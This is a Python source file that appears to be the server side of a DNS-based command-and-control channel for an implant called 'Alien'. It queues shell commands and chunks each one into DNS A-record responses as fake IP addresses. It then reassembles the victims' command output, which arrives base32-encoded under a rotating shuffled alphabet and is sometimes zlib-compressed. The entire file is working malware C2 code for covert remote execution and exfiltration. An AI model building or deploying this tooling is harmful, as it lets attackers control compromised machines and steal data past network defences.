import logging
import socket
import zlib
from enum import IntEnum

from Alien.utilities.communication import BeaconResponse, BeaconResult, ResultCodes
from Alien.utilities.encodings import (
    CHARACTER_SET,
    bruteforce_base32,
    decode_possibly_padded_str_into_int,
    determine_shuffled_alphabet_from_seed,
    encode_int_into_str,
)

logger = logging.getLogger("dns_c2")

class MessageTypes(IntEnum):
    first_alive = 0
    send = 1
    receive = 2
    send_and_receive = 3
    main_alive = 4

class TaskTypes(IntEnum):
    static = 43
    cmd = 70
    compressed_cmd = 71
    file = 95
    compressed_file = 96

class BeaconStates(IntEnum):
    firstalive_done = 0
    payloadsize_sent = 1
    pending_commandresult = 2
    receiving_commandresult = 3
    sleeping = 4


CODE_FOR_ZLIB_DEFLATED_OUTPUT = 61

MESSAGETYPE_FOR_BEACON_STATE = {
    BeaconStates.firstalive_done: None,
    BeaconStates.payloadsize_sent: MessageTypes.receive,
    BeaconStates.pending_commandresult: MessageTypes.send,
    BeaconStates.receiving_commandresult: MessageTypes.send,
}

class AlienBeacon:
    def __init__(self, id, counter):
        self.id = id
        self.counter = counter
        self.alphabet = determine_shuffled_alphabet_from_seed(self.counter, CHARACTER_SET)
        self.command_sent = ""
        self.buffer_size = 0

        self.command_queue = []
        self.result = b""
        self.state = BeaconStates.firstalive_done

    def log(self, message, loglevel=logging.INFO):
        logger.log(level=loglevel, msg=f"[BEACON {self.id}] {message}")

    def get_next_command(self, remove_from_queue):
        if len(self.command_queue) <= 0:
            raise ValueError("Could not fetch the next command because no further commands were scheduled!")
        next_command = self.command_queue[0]
        if remove_from_queue:
            self.command_queue.pop(0)
        return next_command

    def encode_expected_prefix(self):
        expected_message_type = MESSAGETYPE_FOR_BEACON_STATE[self.state]
        if expected_message_type is None:
            return encode_int_into_str(self.id, self.alphabet)
        return encode_int_into_str(expected_message_type, self.alphabet) + encode_int_into_str(self.id, self.alphabet)

    def update_counter(self):
        self.counter += 1
        self.alphabet = determine_shuffled_alphabet_from_seed(self.counter, CHARACTER_SET)

    def process_request(self, data):
        currently_expected_prefix = self.encode_expected_prefix()

        if not data.startswith(currently_expected_prefix):
            return False

        remaining_data = data[len(currently_expected_prefix) :]

        if self.state == BeaconStates.firstalive_done:
            return self.process_payloadsize_request(remaining_data)
        if self.state == BeaconStates.payloadsize_sent:
            return self.process_command_receive_request(remaining_data)
        if self.state == BeaconStates.pending_commandresult:
            return self.process_initial_commandresult_request(remaining_data)
        if self.state == BeaconStates.receiving_commandresult:
            return self.process_continued_commandresult_request(remaining_data)

        raise ValueError(f"Unexpected data stream {data}")

    def process_payloadsize_request(self, data):
        self.log("Request: RECEIVE COMMAND SIZE", loglevel=logging.DEBUG)

        self.command = self.get_next_command(remove_from_queue=True)

        payload_size = len(self.command) + 1

        size_as_bytes = b"\xa9" + payload_size.to_bytes(3, "big")
        ip_address = ".".join(map(str, size_as_bytes))

        self.log(f"Response: Sending payload size ({size_as_bytes} bytes --> {ip_address})", loglevel=logging.DEBUG)

        self.state = BeaconStates.payloadsize_sent
        self.update_counter()

        return BeaconResponse(ip_address, None)

    def process_command_receive_request(self, data):
        self.log("Request: RECEIVE COMMAND", loglevel=logging.DEBUG)

        command_chunk_size = 4
        command_chunk_prefix = ""

        if self.command_sent == "":
            command_chunk_size = 3
            command_chunk_prefix = chr(TaskTypes.cmd)

        lower_bound = len(self.command_sent)

        upper_bound = min([len(self.command), len(self.command_sent) + command_chunk_size])

        command_chunk = self.command[lower_bound:upper_bound]

        self.command_sent += command_chunk
        self.log(f"Response: execute command '{command_chunk}'", loglevel=logging.DEBUG)

        command_chunk = command_chunk_prefix + command_chunk

        command_chunk = command_chunk.ljust(4, "E")

        ip_address = socket.inet_ntoa(command_chunk.encode())

        self.update_counter()

        if self.command_sent == self.command:
            self.state = BeaconStates.pending_commandresult

        return BeaconResponse(ip_address, None)

    def process_initial_commandresult_request(self, data: str) -> BeaconResponse:
        self.log("Request: SEND (initial)", loglevel=logging.DEBUG)

        self.state = BeaconStates.receiving_commandresult

        translation_table = data.maketrans(self.alphabet, CHARACTER_SET)
        data = data.translate(translation_table)

        buffer_size = decode_possibly_padded_str_into_int(data[3:6], CHARACTER_SET)

        chunk = data[6:]

        length_of_my_counter = len(encode_int_into_str(self.counter, self.alphabet))
        chunk = chunk[:-length_of_my_counter]
        chunk = chunk.upper()

        decoded_chunk = bruteforce_base32(chunk)

        self.result += decoded_chunk
        self.buffer_size = buffer_size

        self.update_counter()

        self.log(f"Command result chunk received: {decoded_chunk}", loglevel=logging.DEBUG)

        ip_address = "123.111.222.12"
        return BeaconResponse(ip_address, None)

    def process_continued_commandresult_request(self, data):
        self.log("Request: SEND (continued)", loglevel=logging.DEBUG)
        length_of_my_counter = len(encode_int_into_str(self.counter, self.alphabet))

        chunk = data[3:]

        chunk = chunk[:-length_of_my_counter]

        translation_table = chunk.maketrans(self.alphabet, CHARACTER_SET)
        chunk = chunk.translate(translation_table)

        decoded_chunk = bruteforce_base32(chunk)
        self.result += decoded_chunk

        self.update_counter()

        progress = round((len(self.result) / self.buffer_size) * 100, 2)
        self.log(f"Command result chunk received ({progress}%): {decoded_chunk}", loglevel=logging.DEBUG)

        ip_address = "123.111.222.13"
        if len(self.result) >= self.buffer_size:
            first_byte = self.result[0]
            command_output = self.result[1:]

            if first_byte == CODE_FOR_ZLIB_DEFLATED_OUTPUT:
                decompress = zlib.decompressobj(-zlib.MAX_WBITS)
                command_output = decompress.decompress(command_output)
                command_output += decompress.flush()

            self.command = ""
            self.command_sent = ""
            self.buffer_size = 0
            self.result = b""
            self.state = BeaconStates.firstalive_done

            response = BeaconResult(ResultCodes.COMMAND_OUTPUT, command_output)
            return BeaconResponse(ip_address, response)

        return BeaconResponse(ip_address, None)